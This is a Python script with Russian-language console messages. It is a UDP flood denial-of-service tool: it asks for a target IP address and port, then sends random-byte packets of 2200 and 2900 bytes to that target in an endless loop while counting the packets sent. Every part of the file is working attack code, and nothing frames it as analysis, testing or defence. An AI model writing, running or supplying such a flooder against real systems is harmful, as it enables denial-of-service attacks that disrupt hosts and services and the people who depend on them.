import sys
import os
import socket
import random
import platform

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(2200)
bytes1 = random._urandom(2900)
system = platform.uname()[0]

def cls():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")

cls()

try:
    os.system("python3 src/logo.py")
    ip = input("Введите IP цели: ")
    port = int(input("Введите порт: "))
    os.system("python3 src/Starter.py")
except SyntaxError:
    print(R + '[-] ' + C + 'Ошибка кода: 422 Невозможно обработать')

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print(f"Отправка {sent} пакетов на {ip} через порт:{port}")
        
        while True:
            sock.sendto(bytes1, (ip, port))
            sent = sent + 1
            print(f"Отправка {sent} пакетов на {ip} через порт:{port}")
             
except KeyboardInterrupt:
    print('\n' + R + '[!]' + C + ' Прервано с клавиатуры! Завершаю процесс...' + W)
      
except socket.gaierror:
    print(R + '[-] ' + C + 'Нет адреса, связанного с именем хоста! Неизвестный адрес')
    print(R + '[-] ' + C + 'Пожалуйста, укажите рабочий IP адрес!')
      
except NameError:
    print(R + '[-] ' + C + 'Нет адреса, связанного с именем хоста! Неизвестный адрес')
    print(R + '[-] ' + C + 'Пожалуйста, укажите рабочий IP адрес!')
